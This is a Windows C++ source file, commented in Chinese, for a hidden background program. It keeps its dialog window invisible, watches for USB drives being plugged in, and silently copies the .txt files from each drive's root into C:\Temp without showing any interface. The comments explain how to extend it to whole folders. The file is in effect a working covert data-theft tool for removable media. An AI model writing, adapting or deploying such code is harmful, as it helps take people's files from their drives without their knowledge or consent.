#include <Windows.h>
#include <Dbt.h>
#include <stdio.h>
#include <iostream>
#include "resource.h"

// 根据自己需要修改
// 目前用了 SHFileOperation 函数实现复制，目前仅复制 U 盘根目录上的 txt 文件
// 这个 API 可以复制文件夹，路径最后得双\0
void DoAction(char letter) {
  char from[100] = "X:\\*.txt\0";   
  from[0] = letter;
  SHFILEOPSTRUCTA s = { 0 };
  s.wFunc = FO_COPY;
  s.fFlags = FOF_NO_UI;   // 不显示界面
  s.pTo = "C:\\Temp\0";   // 目标路径，去这个路径找
  s.pFrom = from;
  SHFileOperationA(&s);
}


INT_PTR CALLBACK DialogProc(HWND hDlg, UINT uMsg, WPARAM wParam,
                            LPARAM lParam) {
  switch (uMsg) {
  // 设备变化通知
  case WM_DEVICECHANGE:
    // 只监听插入， DBT_DEVICEREMOVECOMPLETE 是拔出
    if (DBT_DEVICEARRIVAL == wParam) {
      PDEV_BROADCAST_HDR pHdr = (PDEV_BROADCAST_HDR)lParam;
      switch (pHdr->dbch_devicetype) {
      case DBT_DEVTYP_VOLUME: {
        PDEV_BROADCAST_VOLUME pDevVolume = (PDEV_BROADCAST_VOLUME)pHdr;

        // 获取盘符
        for (int i = 0; i < 26; i++) {
          if (pDevVolume->dbcv_unitmask & (1 << i)) {
            char letter = 'A' + i;
            DoAction(letter);
          }
        }
        break;
      }
      }
    }
    break;
  case WM_COMMAND:
    switch (LOWORD(wParam)) {
    case IDCANCEL:
      SendMessage(hDlg, WM_CLOSE, 0, 0);
      return TRUE;
    }
    break;

  case WM_CLOSE:
    if (MessageBox(hDlg, TEXT("Close the program?"), TEXT("Close"),
                   MB_ICONQUESTION | MB_YESNO) == IDYES) {
      DestroyWindow(hDlg);
    }
    return TRUE;

  case WM_DESTROY:
    PostQuitMessage(0);
    return TRUE;
  }

  return FALSE;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE h0, LPSTR lpCmdLine, int nCmdShow) {
  HWND hDlg;
  MSG msg;
  BOOL ret;

  hDlg =
    CreateDialogParam(hInst, MAKEINTRESOURCE(IDD_DIALOG1), 0, DialogProc, 0);

  // 默认隐藏界面，用SW_HIDE
  // ShowWindow(hDlg, nCmdShow); 
  ShowWindow(hDlg, SW_HIDE);

  while ((ret = GetMessage(&msg, 0, 0, 0)) != 0) {
    if (ret == -1) return -1;
    if (!IsDialogMessage(hDlg, &msg)) {
      TranslateMessage(&msg);
      DispatchMessage(&msg);
    }
  }

  return 0;
}